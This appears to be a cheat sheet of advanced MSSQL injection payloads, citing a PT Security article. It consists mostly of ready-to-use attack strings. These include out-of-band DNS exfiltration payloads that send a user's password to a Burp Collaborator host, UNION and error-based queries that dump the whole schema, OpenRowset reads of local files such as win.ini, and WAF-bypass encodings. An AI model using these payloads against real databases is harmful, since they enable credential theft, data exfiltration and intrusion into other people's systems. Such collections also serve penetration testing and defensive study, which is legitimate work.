# MSSQL Advanced Exploitation Tips


## DNS Out-of-Band

### fn_get_audit_file()
```
?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

### fn_trace_gettable()

```
?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

## Alternative Error-Based vectors

```
SUSER_NAME()
USER_NAME()
PERMISSIONS()
DB_NAME()
FILE_NAME()
TYPE_NAME()
COL_NAME()
```

Example: `1'%2buser_name(@@version)--`

##  Retrieve an entire table in one query

```
?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto-- 
```

```
?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)-- 
```

## Reading local files

```
?id=-1+union+select+null,(select+x+from+OpenRowset(BULK+’C:\Windows\win.ini’,SINGLE_CLOB)+R(x)),null,null
```

### Error-based vector

```
?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```

## Retrieving the current query

```
?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```

## WAF bypasses

Non-standard whitespace characters: %C2%85 или %C2%A0:

```
?id=1%C2%85union%C2%85select%C2%A0null,@@version,null-- 
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
?id=0eunion+select+null,@@version,null--
```
```
?id=0xunion+select+null,@@version,null-- 
```

A period instead of a whitespace between FROM and a column name:

```
?id=1+union+select+null,@@version,null+from.users-- 
```

\N seperator between SELECT and a throwaway column:

```
?id=0xunion+select\Nnull,@@version,null+from+users-- 
```

### Source

https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/